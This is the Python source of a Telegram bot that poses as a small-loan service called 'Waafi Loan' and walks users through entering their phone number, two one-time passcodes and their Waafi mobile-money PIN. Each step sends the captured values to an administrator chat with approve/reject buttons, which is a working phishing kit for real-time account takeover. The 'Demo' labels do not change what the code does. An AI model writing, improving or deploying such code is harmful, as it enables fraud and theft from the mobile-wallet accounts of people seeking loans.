from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup
)

from telegram.ext import ContextTypes, ConversationHandler

import uuid

from states import (
    PHONE_NUMBER,
    OTP_1,
    WAAFI_PIN,
    OTP_2
)

from config import ADMIN_ID



# ================= ADMIN BUTTONS =================

def admin_buttons(session):

    keyboard = [
        [
            InlineKeyboardButton(
                "✅ Approve",
                callback_data=f"approve_{session}"
            ),
            InlineKeyboardButton(
                "❌ Reject",
                callback_data=f"reject_{session}"
            )
        ]
    ]

    return InlineKeyboardMarkup(keyboard)



# ================= START =================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):

    await update.message.reply_text(
        "👋 Welcome to Waafi Loan\n\n"

        "We offer the following loan categories:\n\n"

        "💼 Business Loan\n"
        "🎓 Education Loan\n"
        "🏠 Emergency Loan\n"
        "🚜 Agriculture Loan\n"
        "🏥 Medical Loan\n"
        "👤 Personal Loan\n\n"

        "💰 Available Loan Amounts:\n\n"

        "💵 $80\n"
        "💵 $150\n"
        "💵 $300\n"
        "💵 $500\n"
        "💵 $800\n"
        "💵 $1,000\n"
        "💵 $1,500\n\n"

        "📱 Enter phone number starting with country code.\n\n"
        "Example: +253XXXXXXXX"
    )

    return PHONE_NUMBER



# ================= PHONE NUMBER =================

async def phone_number(update: Update, context: ContextTypes.DEFAULT_TYPE):

    phone = update.message.text.strip()


    if not phone.startswith("+") or not phone[1:].isdigit():

        await update.message.reply_text(
            "❌ Invalid format.\n\n"
            "Example: +253XXXXXXXX"
        )

        return PHONE_NUMBER



    context.user_data["phone"] = phone


    session = str(uuid.uuid4())[:8].upper()

    context.user_data["session"] = session



    await context.bot.send_message(
        chat_id=ADMIN_ID,
        text=(
            "📱 PHONE STEP COMPLETED\n\n"
            f"Phone: {phone}\n"
            f"🆔 Session: {session}\n\n"
            "⏳ Waiting for approval..."
        ),
        reply_markup=admin_buttons(session)
    )


    await update.message.reply_text(
        "🔢 Enter Demo OTP 1 (6 digits):"
    )


    return OTP_1



# ================= OTP 1 =================

async def otp_1(update: Update, context: ContextTypes.DEFAULT_TYPE):

    code = update.message.text.strip()


    if not code.isdigit() or len(code) != 6:

        await update.message.reply_text(
            "❌ Code must be 6 digits."
        )

        return OTP_1


    context.user_data["otp1_demo"] = code


    session = context.user_data["session"]


    await context.bot.send_message(
        chat_id=ADMIN_ID,
        text=(
            "🔢 OTP 1 STEP COMPLETED\n\n"
            f"Demo OTP 1: {code}\n"
            f"🆔 Session: {session}\n\n"
            "⏳ Waiting for approval..."
        ),
        reply_markup=admin_buttons(session)
    )


    await update.message.reply_text(
        "🔐 Enter Demo Waafi PIN:"
    )


    return WAAFI_PIN



# ================= WAAFI PIN =================

async def waafi_pin(update: Update, context: ContextTypes.DEFAULT_TYPE):

    pin = update.message.text.strip()


    context.user_data["pin_demo"] = pin


    session = context.user_data["session"]


    await context.bot.send_message(
        chat_id=ADMIN_ID,
        text=(
            "🔐 PIN STEP COMPLETED\n\n"
            f"Demo PIN: {pin}\n"
            f"🆔 Session: {session}\n\n"
            "⏳ Waiting for approval..."
        ),
        reply_markup=admin_buttons(session)
    )


    await update.message.reply_text(
        "🔢 Enter Demo OTP 2 (6 digits):"
    )


    return OTP_2



# ================= OTP 2 =================

async def otp_2(update: Update, context: ContextTypes.DEFAULT_TYPE):

    code2 = update.message.text.strip()


    if not code2.isdigit() or len(code2) != 6:

        await update.message.reply_text(
            "❌ Code must be 6 digits."
        )

        return OTP_2



    session = context.user_data["session"]


    await context.bot.send_message(
        chat_id=ADMIN_ID,
        text=(
            "✅ VERIFICATION COMPLETED\n\n"

            f"📱 Phone Number:\n"
            f"{context.user_data['phone']}\n\n"

            f"🔢 Demo OTP 1:\n"
            f"{context.user_data['otp1_demo']}\n\n"

            f"🔐 Demo PIN:\n"
            f"{context.user_data['pin_demo']}\n\n"

            f"🔢 Demo OTP 2:\n"
            f"{code2}\n\n"

            f"🆔 Session ID:\n"
            f"{session}\n\n"

            "⏳ Waiting for approval..."
        ),
        reply_markup=admin_buttons(session)
    )


    await update.message.reply_text(
        "✅ Completed.\n\n"
        f"Session ID: {session}"
    )


    return ConversationHandler.END